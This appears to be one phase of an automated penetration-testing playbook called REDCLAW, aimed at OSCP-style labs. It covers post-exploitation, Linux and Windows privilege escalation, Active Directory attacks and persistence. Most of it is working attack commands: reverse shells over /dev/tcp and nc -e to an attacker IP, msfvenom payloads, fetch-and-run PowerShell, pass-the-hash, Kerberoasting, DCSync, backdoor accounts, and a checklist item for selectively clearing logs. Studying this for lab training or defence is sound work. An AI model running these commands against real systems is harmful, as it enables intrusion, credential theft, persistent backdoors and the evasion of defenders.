# ðŸ‘‘ REDCLAW V2.0 - POST-EXPLOITATION PHASE

> **Phase 6 of 8: Privilege Escalation, Lateral Movement & Persistence**  
> **Principle: "Initial access is just the beginning - privilege escalation is the real challenge"**

---

## ðŸ“‹ PHASE OVERVIEW

### Purpose

Post-Exploitation is where **initial access becomes total compromise**. After obtaining a shell, this phase:
- **Escalates privileges** (user â†’ root/SYSTEM)
- **Moves laterally** (one machine â†’ entire network)
- **Establishes persistence** (maintain access after reboot)
- **Extracts credentials** (passwords, hashes, keys)
- **Maps internal network** (discover additional targets)
- **Accomplishes objectives** (find flags, exfiltrate data)

**OSCP 2024+ CRITICAL:** Active Directory exploitation is now **MANDATORY**. Must demonstrate:
- Kerberoasting
- Pass-the-Hash
- Lateral movement
- Domain privilege escalation

---

## ðŸŽ¯ OBJECTIVES OF THIS PHASE

### What Success Looks Like:

```
âœ… Root/SYSTEM privileges obtained
âœ… All flags/objectives captured
âœ… Persistence established (survives reboot)
âœ… Credentials extracted (passwords, hashes, tickets)
âœ… Lateral movement successful (if multi-host)
âœ… Internal network mapped
âœ… Domain Admin achieved (if Active Directory)
âœ… Stealth maintained (no alerts, minimal logs)
```

### Completion Criteria (Intelligent Detection):

```python
def is_post_exploitation_complete(context):
    """
    Multi-signal completion detection
    """
    # Signal 1: All Objectives Met
    if context.all_flags_found() and context.privilege == "root":
        return True, "All objectives completed"
    
    # Signal 2: Maximum Privilege Achieved
    if context.privilege in ["root", "SYSTEM", "Domain Admin"]:
        if context.persistence_established:
            return True, "Max privilege + persistence"
    
    # Signal 3: No More Escalation Paths
    if context.enumeration_complete and len(context.escalation_vectors) == 0:
        return False, "No privilege escalation paths found"
    
    # Signal 4: Hard Timeout
    if time_elapsed() > context.max_postexp_time:
        return True, "Maximum post-exploitation time reached"
    
    return False, "Continue post-exploitation"
```

---

## ðŸ”¬ RESEARCH FINDINGS: PRIVILEGE ESCALATION (2026)

### Linux Privilege Escalation - Top Vectors

**Research-Backed Priority Order:**

```
Tier 1: QUICK WINS (5-15 minutes)
â”œâ”€ 1. Sudo misconfigurations (sudo -l)
â”‚  â””â”€ NOPASSWD entries, sudo version exploits
â”œâ”€ 2. SUID/SGID binaries
â”‚  â””â”€ find / -perm -4000 2>/dev/null
â”œâ”€ 3. Writable /etc/passwd
â”‚  â””â”€ openssl passwd -1 -salt xyz password
â””â”€ 4. Cron jobs (writable scripts)
   â””â”€ cat /etc/crontab, ls -la /etc/cron.*

Tier 2: MODERATE EFFORT (15-60 minutes)
â”œâ”€ 5. Kernel exploits (last resort, risky)
â”‚  â””â”€ DirtyCow, Overlayfs, PwnKit
â”œâ”€ 6. NFS shares (no_root_squash)
â”‚  â””â”€ cat /etc/exports
â”œâ”€ 7. Capabilities misconfigurations
â”‚  â””â”€ getcap -r / 2>/dev/null
â””â”€ 8. Docker escape (if in container)
   â””â”€ Check /.dockerenv, mount | grep docker

Tier 3: ADVANCED (1-4 hours)
â”œâ”€ 9. Custom binary exploitation
â”œâ”€ 10. Linux PAM backdoors
â””â”€ 11. LD_PRELOAD hijacking
```

---

### Windows Privilege Escalation - Top Vectors

```
Tier 1: QUICK WINS (5-15 minutes)
â”œâ”€ 1. Token impersonation (Potato family)
â”‚  â”œâ”€ JuicyPotato (Windows 7-10)
â”‚  â”œâ”€ RoguePotato (Windows 10+)
â”‚  â””â”€ PrintSpoofer (Windows 10/11)
â”œâ”€ 2. Unquoted service paths
â”‚  â””â”€ wmic service get name,pathname,startmode
â”œâ”€ 3. AlwaysInstallElevated (MSI exploit)
â”‚  â””â”€ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
â””â”€ 4. Stored credentials
   â””â”€ cmdkey /list, vaultcmd /listcreds

Tier 2: MODERATE EFFORT (15-60 minutes)
â”œâ”€ 5. Weak service permissions
â”‚  â””â”€ accesschk.exe /accepteula -uwcqv *
â”œâ”€ 6. DLL hijacking
â”œâ”€ 7. Registry AutoRun keys
â””â”€ 8. Scheduled tasks (writable)

Tier 3: ADVANCED (1-4 hours)
â”œâ”€ 9. Kernel exploits (MS16-032, MS17-017)
â”œâ”€ 10. UAC bypass techniques
â””â”€ 11. Custom binary exploitation
```

---

### Active Directory - Mandatory OSCP 2024+ Techniques

**Research Finding:** "In the OSCP+ you now have to demonstrate AD exploitation. Kerberoasting is mandatory."

```
Phase 1: RECONNAISSANCE
â”œâ”€ BloodHound (map AD relationships)
â”œâ”€ PowerView (enumerate users, groups, trusts)
â””â”€ ldapsearch (LDAP queries)

Phase 2: CREDENTIAL ACCESS
â”œâ”€ Kerberoasting (SPN accounts)
â”œâ”€ AS-REP Roasting (no pre-auth accounts)
â”œâ”€ DCSync (if DA achieved)
â””â”€ NTDS.dit extraction

Phase 3: LATERAL MOVEMENT
â”œâ”€ Pass-the-Hash (PTH)
â”œâ”€ Pass-the-Ticket (PTT)
â”œâ”€ OverPass-the-Hash
â””â”€ PSExec, WMI, WinRM

Phase 4: PERSISTENCE
â”œâ”€ Golden Ticket (Krbtgt hash)
â”œâ”€ Silver Ticket (Service account hash)
â”œâ”€ Skeleton Key
â””â”€ DCShadow
```

---

## ðŸ§ LINUX PRIVILEGE ESCALATION (DETAILED)

### Enumeration Scripts (AutoRecon)

**LinPEAS (Linux Privilege Escalation Awesome Script):**

```bash
# Download and execute
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or download locally, transfer to target
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8000

# On target:
wget http://10.10.14.5:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a 2>/dev/null | tee linpeas_output.txt
```

**LinEnum:**

```bash
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh
```

**LSE (Linux Smart Enumeration):**

```bash
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh | sh
```

---

### Technique 1: Sudo Exploitation

**Check sudo permissions:**

```bash
sudo -l
```

**Common exploits:**

```bash
# 1. sudo NOPASSWD
# If you see: (ALL) NOPASSWD: /usr/bin/find
sudo find /etc/passwd -exec /bin/sh \;

# 2. sudo vim/vi
sudo vim -c ':!/bin/sh'

# 3. sudo less/more
sudo less /etc/hosts
!/bin/sh

# 4. sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'

# 5. sudo python
sudo python -c 'import os; os.system("/bin/sh")'

# 6. sudo nmap (old versions)
echo "os.execute('/bin/sh')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse

# 7. Sudo version exploit (CVE-2021-3156 - Baron Samedit)
sudoedit -s /
```

**GTFOBins Reference:** https://gtfobins.github.io/

---

### Technique 2: SUID/SGID Binaries

**Find SUID binaries:**

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

**Find SGID binaries:**

```bash
find / -perm -2000 -type f 2>/dev/null
```

**Common SUID exploits:**

```bash
# 1. find (SUID)
./find . -exec /bin/sh -p \; -quit

# 2. vim (SUID)
./vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# 3. nmap (SUID, old versions)
./nmap --interactive
nmap> !sh

# 4. cp (SUID)
# Overwrite /etc/passwd
LFILE=/etc/passwd
./cp /tmp/passwd $LFILE

# 5. base64 (SUID - read any file)
LFILE=/etc/shadow
./base64 "$LFILE" | base64 --decode

# 6. Custom SUID binary (buffer overflow)
# Requires binary exploitation
```

---

### Technique 3: Writable /etc/passwd

**Check if writable:**

```bash
ls -la /etc/passwd
```

**If writable, add root user:**

```bash
# Generate password hash
openssl passwd -1 -salt xyz password
# Output: $1$xyz$rjarwc/BNjNa7cIZqQlM0.

# Add to /etc/passwd
echo 'hacker:$1$xyz$rjarwc/BNjNa7cIZqQlM0.:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch user
su hacker
# Password: password
```

---

### Technique 4: Cron Jobs

**Enumerate cron jobs:**

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/*
```

**Exploit writable cron script:**

```bash
# If /opt/backup.sh runs as root and is writable:
echo '#!/bin/bash' > /opt/backup.sh
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/backup.sh
chmod +x /opt/backup.sh

# Wait for cron to execute, catch shell:
nc -lvnp 4444
```

---

### Technique 5: Kernel Exploits (Last Resort)

**Check kernel version:**

```bash
uname -a
cat /proc/version
```

**Search for exploits:**

```bash
searchsploit linux kernel 5.4.0
```

**Common kernel exploits:**

```bash
# 1. DirtyCow (CVE-2016-5195)
# Kernel < 4.8.3

# 2. Overlayfs (CVE-2021-3493)
# Ubuntu 20.10, 20.04, 18.04, 16.04
wget https://github.com/brisket/CVE-2021-3493/raw/main/exploit.c
gcc exploit.c -o exploit
./exploit

# 3. PwnKit (CVE-2021-4034)
# Polkit < 0.120
wget https://github.com/arthepsy/CVE-2021-4034/raw/main/cve-2021-4034-poc.c
gcc cve-2021-4034-poc.c -o pwnkit
./pwnkit
```

**âš ï¸ WARNING:** Kernel exploits can crash the system. Use only if no other option.

---

### Technique 6: NFS Shares (no_root_squash)

**Check NFS exports:**

```bash
cat /etc/exports
showmount -e 10.10.10.5
```

**If no_root_squash is set:**

```bash
# On attacker machine:
mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.5:/shared /tmp/nfs

# Create SUID binary
echo 'int main() { setuid(0); system("/bin/bash"); }' > /tmp/nfs/shell.c
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell
chmod +s /tmp/nfs/shell

# On target:
/shared/shell
```

---

### Technique 7: Capabilities

**Enumerate capabilities:**

```bash
getcap -r / 2>/dev/null
```

**Exploit cap_setuid+ep:**

```bash
# If python3 has cap_setuid:
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## ðŸªŸ WINDOWS PRIVILEGE ESCALATION (DETAILED)

### Enumeration Scripts

**WinPEAS:**

```powershell
# Download
iwr -uri http://10.10.14.5/winPEASx64.exe -Outfile winPEAS.exe

# Execute
.\winPEAS.exe
```

**PowerUp (PowerSploit):**

```powershell
# Download
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerUp.ps1')

# Run all checks
Invoke-AllChecks
```

**PrivescCheck:**

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PrivescCheck.ps1')
Invoke-PrivescCheck
```

---

### Technique 1: Token Impersonation (Potato Exploits)

**Check privileges:**

```cmd
whoami /priv
```

**If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege enabled:**

```powershell
# JuicyPotato (Windows 7-10)
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c nc.exe 10.10.14.5 4444 -e cmd.exe" -t *

# RoguePotato (Windows 10 1809+)
.\RoguePotato.exe -r 10.10.14.5 -e "cmd.exe /c nc.exe 10.10.14.5 4444 -e cmd.exe" -l 9999

# PrintSpoofer (Windows 10/11/Server 2019/2022)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Windows Server 2012-2022, Windows 8-11)
.\GodPotato.exe -cmd "cmd /c whoami"
```

---

### Technique 2: Unquoted Service Paths

**Enumerate services:**

```cmd
wmic service get name,pathname,displayname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

**Exploit:**

```cmd
# If service path is: C:\Program Files\My Service\service.exe
# Windows will try: C:\Program.exe, C:\Program Files\My.exe

# Create malicious executable:
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o Program.exe

# Place in C:\
move Program.exe C:\Program.exe

# Restart service
sc stop vulnerable-service
sc start vulnerable-service
```

---

### Technique 3: AlwaysInstallElevated

**Check registry:**

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**If both are 1:**

```bash
# Create malicious MSI
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o shell.msi

# On target:
msiexec /quiet /qn /i C:\shell.msi
```

---

### Technique 4: Stored Credentials

**Enumerate:**

```cmd
cmdkey /list
vaultcmd /listcreds:"Windows Credentials"

# Saved credentials in files
dir /s /b C:\*pass*.txt C:\*pass*.xml C:\*pass*.ini C:\*cred* C:\*vnc* C:\*.config*

# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

**Use stored credentials:**

```cmd
runas /savecred /user:DOMAIN\Administrator cmd.exe
```

---

### Technique 5: Weak Service Permissions

**Enumerate with accesschk:**

```cmd
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

**If service is modifiable:**

```cmd
# Change service binary path
sc config vulnerable-service binpath= "C:\nc.exe 10.10.14.5 4444 -e cmd.exe"

# Restart service
sc stop vulnerable-service
sc start vulnerable-service
```

---

## ðŸŒ ACTIVE DIRECTORY EXPLOITATION (OSCP 2024+ MANDATORY)

### Phase 1: Reconnaissance

**BloodHound Collection:**

```powershell
# SharpHound (C# collector)
.\SharpHound.exe -c All --zipfilename bloodhound.zip

# Upload to BloodHound GUI
# Analyze: "Shortest Path to Domain Admin"
```

**PowerView Enumeration:**

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Enumerate domain users
Get-DomainUser | select samaccountname

# Enumerate domain admins
Get-DomainGroupMember "Domain Admins"

# Find domain controllers
Get-DomainController

# Enumerate SPNs (for Kerberoasting)
Get-DomainUser -SPN
```

---

### Phase 2: Kerberoasting (MANDATORY)

**What it is:** Request TGS tickets for accounts with SPNs, crack offline

**Execute:**

```powershell
# Using Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Using PowerView
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat

# Using Impacket (from Linux)
GetUserSPNs.py -request -dc-ip 10.10.10.5 DOMAIN/user:password
```

**Crack hashes:**

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

### Phase 3: AS-REP Roasting

**What it is:** Accounts with "Do not require Kerberos preauthentication" can be roasted

**Execute:**

```powershell
# Using Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Using Impacket
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 10.10.10.5
```

---

### Phase 4: Pass-the-Hash (MANDATORY)

**What it is:** Use NTLM hash to authenticate (no plaintext password needed)

**Execute:**

```bash
# Using Impacket
psexec.py -hashes :NTLM_HASH DOMAIN/Administrator@10.10.10.5

# Using CrackMapExec
crackmapexec smb 10.10.10.5 -u Administrator -H NTLM_HASH

# Using Evil-WinRM
evil-winrm -i 10.10.10.5 -u Administrator -H NTLM_HASH
```

---

### Phase 5: Lateral Movement

**PSExec:**

```bash
impacket-psexec DOMAIN/user:password@10.10.10.6
```

**WMI:**

```bash
impacket-wmiexec DOMAIN/user:password@10.10.10.6
```

**WinRM:**

```bash
evil-winrm -i 10.10.10.6 -u user -p password
```

---

### Phase 6: DCSync (Domain Admin â†’ Extract All Hashes)

**What it is:** Replicate domain controller, extract NTDS.dit

**Execute:**

```powershell
# Using Mimikatz (as Domain Admin)
lsadump::dcsync /domain:domain.local /all /csv
```

---

## ðŸ” PERSISTENCE MECHANISMS

### Linux Persistence

```bash
# 1. SSH Key
mkdir /root/.ssh
echo "ssh-rsa AAAAB3... attacker@kali" >> /root/.ssh/authorized_keys

# 2. Cron job
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" | crontab -

# 3. Backdoor user
useradd -m -s /bin/bash backdoor
echo "backdoor:password" | chpasswd
usermod -aG sudo backdoor

# 4. SUID bash
cp /bin/bash /tmp/.hidden
chmod 4755 /tmp/.hidden
```

---

### Windows Persistence

```powershell
# 1. Backdoor user
net user backdoor Password123! /add
net localgroup Administrators backdoor /add

# 2. Registry AutoRun
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# 3. Scheduled task
schtasks /create /tn Backdoor /tr C:\backdoor.exe /sc onstart /ru SYSTEM

# 4. Service
sc create Backdoor binPath= "C:\backdoor.exe" start= auto
sc start Backdoor
```

---

## âœ… PHASE COMPLETION CHECKLIST

```markdown
## POST-EXPLOITATION COMPLETE âœ“

### Privilege Escalation
- [ ] Root/SYSTEM privilege obtained
- [ ] Enumeration completed (LinPEAS/WinPEAS)
- [ ] All escalation vectors attempted

### Objectives
- [ ] All flags captured
- [ ] Sensitive files accessed
- [ ] Credentials extracted

### Persistence
- [ ] Backdoor user created
- [ ] SSH key / Registry key added
- [ ] Persistence survives reboot

### Active Directory (if applicable)
- [ ] Kerberoasting executed
- [ ] Lateral movement successful
- [ ] Domain Admin achieved (or attempted)

### Stealth
- [ ] Logs selectively cleared
- [ ] Minimal footprint maintained
- [ ] No alerts triggered
```

---

## ðŸš€ NEXT PHASE

Once Post-Exploitation is complete, proceed to **REPORTING.md**.

**Handoff to Reporting Phase:**
```
âœ… Root access: Achieved on 10.10.10.5
âœ… Flags captured: user.txt, root.txt
âœ… Credentials: 15 hashes extracted
âœ… Persistence: SSH key, cron job established
âœ… AD exploitation: Kerberoasted 3 accounts, Domain Admin achieved

â†’ BEGIN: Documentation & Reporting
```

---

**VERSION:** 2.0.0  
**REFERENCES:** CORE_ARCHITECTURE.md, EXPLOITATION.md  
**NEXT:** REPORTING.md  
**STATUS:** âœ… POST-EXPLOITATION COMPLETE
